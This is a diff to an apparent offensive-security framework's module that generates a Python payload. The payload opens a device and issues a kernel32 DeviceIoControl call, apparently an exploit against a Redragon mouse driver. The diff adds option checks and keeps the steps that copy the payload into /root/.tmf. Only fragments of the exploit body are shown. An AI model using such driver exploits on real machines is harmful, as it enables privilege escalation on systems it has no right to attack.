@@ -236,11 +236,15 @@ Handler Details:
                 except Exception:
                     pass
         else:
-            print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Payload...')
-            try:
-                if os.path.exists("/usr/share/Terminator/modules/payloads/redragon_mouse.log"):
-                    with open("/usr/share/Terminator/modules/payloads/redragon_mouse.log", "w") as c:
-                        c.write('''
+            if ERR_TEXT == "" or RUN_TEXT == "" or DEVICE_NAME == "":
+                print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
+            else:
+                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Payload...')
+                time.sleep(0.6)
+                try:
+                    if os.path.exists("/usr/share/Terminator/modules/payloads/redragon_mouse.log"):
+                        with open("/usr/share/Terminator/modules/payloads/redragon_mouse.log", "w") as c:
+                            c.write('''
 import ctypes, sys
 from ctypes import *
 import io
@@ -265,12 +269,12 @@ else:
     
     kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)
 ''')
-                        c.close()
-                    os.system('cp -r /usr/share/Terminator/modules/payloads/redragon_mouse.log /root/.tmf > /dev/null 2>&1')
-                    os.system('mv /root/.tmf/redragon_mouse.log /root/.tmf/redragon_mouse.py > /dev/null 2>&1')
-                    print(Fore.YELLOW+'[+]'+Fore.RESET+' Payload Saved At: "/root/.tmf"')
-            except:
-                pass
+                            c.close()
+                        os.system('cp -r /usr/share/Terminator/modules/payloads/redragon_mouse.log /root/.tmf > /dev/null 2>&1')
+                        os.system('mv /root/.tmf/redragon_mouse.log /root/.tmf/redragon_mouse.py > /dev/null 2>&1')
+                        print(Fore.YELLOW+'[+]'+Fore.RESET+' Payload Saved At: "/root/.tmf"')
+                except:
+                    pass
     else:
         print(Fore.RED+'[-]'+Fore.RESET+' Unknown Command: "'+tmf[0]+'"')
     try:
